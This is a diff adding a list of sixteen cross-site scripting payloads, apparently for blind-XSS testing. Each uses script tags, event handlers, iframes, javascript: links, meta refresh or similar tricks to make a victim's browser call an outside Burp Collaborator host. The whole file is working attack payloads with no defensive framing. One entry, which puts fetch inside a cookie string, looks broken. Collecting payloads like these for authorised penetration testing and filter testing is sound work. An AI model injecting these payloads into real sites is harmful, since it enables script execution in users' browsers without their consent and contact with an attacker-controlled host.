@@ -1,0 +1,16 @@
+1. <script>fetch('http://xyz.burpcollaborator.net')</script>
+2. <img src="data:image/png;base64,invalid" onerror="fetch('http://xyz.burpcollaborator.net')">
+3. <iframe srcdoc="<script>fetch('http://xyz.burpcollaborator.net')</script>"></iframe>
+4. <a href="javascript:window.location='http://xyz.burpcollaborator.net'">Click Here</a>
+5. <a href="#" onmouseover="fetch('http://xyz.burpcollaborator.net')">Hover over me!</a>
+6. <meta http-equiv="refresh" content="0; url=http://xyz.burpcollaborator.net">
+7. <script>document.cookie='XSS=1; fetch("http://xyz.burpcollaborator.net")'</script>
+8. <object data="http://xyz.burpcollaborator.net" type="text/html" width="0" height="0"></object>
+9. <form action="http://xyz.burpcollaborator.net" method="GET"><input type="submit" value="Submit"></form>
+10. <div style="background-image:url('javascript:fetch(\'http://xyz.burpcollaborator.net\')')">Test</div>
+11. <script>window.onerror = function(){fetch('http://xyz.burpcollaborator.net')};</script>
+12. <script>setTimeout(function(){fetch('http://xyz.burpcollaborator.net')}, 1000);</script>
+13. <audio src="invalid.mp3" onerror="fetch('http://xyz.burpcollaborator.net')"></audio>
+14. <script>document.write('<img src="http://xyz.burpcollaborator.net">');</script>
+15. <a href="javascript:window.location.href='http://xyz.burpcollaborator.net'">Click Here</a>
+16. <script>document.body.appendChild(document.createElement('img')).src='http://xyz.burpcollaborator.net';</script>
